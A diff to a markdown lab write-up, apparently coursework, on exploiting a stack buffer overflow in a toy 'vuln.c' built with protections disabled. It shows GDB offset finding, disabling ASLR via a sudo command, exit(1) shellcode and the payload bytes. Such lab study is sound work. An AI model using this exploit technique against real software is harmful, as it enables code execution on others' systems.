@@ -17,7 +17,6 @@ This writeup walks through every step we took: from understanding the vulnerabil
 ## 2. Understanding the Vulnerable Program
 
 The vulnerable program, `vuln.c`, looks like this:
-
 ```c
 // vuln.c
 #include <stdio.h>
@@ -42,7 +41,6 @@ This is the classic buffer overflow vulnerability. By overflowing the buffer str
 ## 3. Compiling the Program
 
 We compiled the program with special flags that disable modern security protections so our exploit can work:
-
 ```bash
 $ gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 \
   -fno-pie -ggdb -z execstack -std=c99 vuln.c -o vuln
@@ -59,7 +57,6 @@ Here is what each flag does:
 ## 4. Finding the Buffer Address with GDB
 
 We used GDB (the GNU Debugger) to inspect the program memory while it runs. We set a breakpoint at the `vuln()` function and examined the stack:
-
 ```text
 (gdb) break vuln
 Breakpoint 1 at 0x1193: file vuln.c, line 5.
@@ -145,19 +142,16 @@ This confirms we have full control over the return address.
 We also inspected the raw stack memory before and after `gets()` was called to see the overflow in action:
 
 **Before gets():**
-
 ```text
 0xffffcd98:  0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
 0xffffcda0:  0xa8 0xcd 0xff 0xff 0xaa 0x61 0x55 0x56
 ```
 
 **After gets() with our egg input:**
-
 ```text
 0xffffcd98:  0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41
 0xffffcda0:  0x41 0x41 0x41 0x41 0x42 0x42 0x42 0x42
 ```
-
 ![Memory dump before and after gets()](/api/content/writeup2/writeup4.png)
 
 The `A` bytes (0x41) filled up the buffer and overwrote EBP. The `B` bytes (0x42) then landed exactly on the return address, confirming our offset calculation was correct.
@@ -194,7 +188,6 @@ Shellcode is the machine code we want to inject and execute. Our goal is to call
 </table>
 
 In assembly instructions, this translates to:
-
 ```asm
 xor %eax, %eax   ; set eax to 0
 inc %eax         ; increment eax to 1 (exit syscall number)
@@ -203,23 +196,19 @@ int $0x80        ; trigger the Linux syscall
 ```
 
 To get the actual machine code bytes for these instructions, we wrote them into a small C file with inline assembly and then disassembled it using objdump:
-
 ```bash
 $ gcc -m32 -fno-stack-protector -fno-pie -std=c99 asm.c -o asm
 $ objdump -d asm > asmdump
 ```
-
 ![objdump disassembly output](/api/content/writeup2/writeup5.png)
 
 From the disassembly output we extracted the machine code bytes:
-
 ```text
 1180:   31 c0    xor %eax,%eax
 1182:   40       inc %eax
 1183:   89 c3    mov %eax,%ebx
 1185:   cd 80    int $0x80
 ```
-
 Our complete shellcode is 7 bytes: `\x31\xc0\x40\x89\xc3\xcd\x80`
 
 ## 6. Building the Exploit Payload (The Egg)
@@ -227,12 +216,10 @@ Our complete shellcode is 7 bytes: `\x31\xc0\x40\x89\xc3\xcd\x80`
 ### 6.1 Disabling ASLR
 
 Before building the egg, we needed a stable, predictable stack address. The system had ASLR (Address Space Layout Randomization) enabled, which randomizes memory addresses on every run, making it impossible to hardcode an address. We disabled it with:
-
 ```bash
 $ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 0
 ```
-
 ```bash
 $ echo "" | ./vuln2
 buffer address: 0xffffcde8
@@ -251,13 +238,11 @@ x86 systems use little endian byte order, meaning the least significant byte com
 ### 6.4 Payload Structure and Padding Calculation
 
 Our payload structure is:
-
 ```text
 [ shellcode 7 bytes ][ padding 5 bytes ][ return address 4 bytes ]
 ```
 
 The padding calculation is straightforward. We know the return address (EIP) is exactly 12 bytes from the start of the buffer. Our shellcode is 7 bytes. So we need padding to fill the remaining space:
-
 ```text
 Offset to EIP      = 12 bytes
 Shellcode length   =  7 bytes
@@ -265,13 +250,11 @@ Padding needed     =  5 bytes
 
 7 + 5 = 12  (fills exactly up to EIP)
 ```
-
 The 5 bytes of padding are just filler (we used the letter `A` five times). They overwrite the tail end of the buffer and the saved EBP register, neither of which matters since we are about to redirect execution anyway.
 
 ### 6.5 Generating the Egg
 
 We assembled the final egg using Python to write the exact bytes to a file:
-
 ```bash
 $ python3 -c 'import sys; sys.stdout.buffer.write(
     b"\x31\xc0\x40\x89\xc3\xcd\x80"
@@ -281,7 +264,6 @@ $ python3 -c 'import sys; sys.stdout.buffer.write(
 ```
 
 We can verify the contents of the egg with `xxd`, which shows the raw bytes:
-
 ```text
 $ xxd egg
 00000000: 31c0 4089 c3cd 8041 4141 4141 e8cd ffff  1.@....AAAAA....
@@ -290,18 +272,15 @@ $ xxd egg
 ## 7. Results
 
 We ran the exploit against the original `vuln` program and confirmed success:
-
 ```bash
 $ ./vuln < egg; echo $?
 1
 ```
-
 ![Exploit result: exit code 1](/api/content/writeup2/writeup6.png)
 
 The program exited cleanly with exit code 1, which is exactly what the machine problem required. There was no segfault, no infinite loop, and no crash. The shellcode executed successfully, called `exit(1)`, and the process terminated with the correct code.
 
 For additional verification, we also confirmed the exploit inside GDB, where it showed the process exiting with code 01:
-
 ```text
 (gdb) run < egg
 [Inferior 1 (process 3110) exited with code 01]
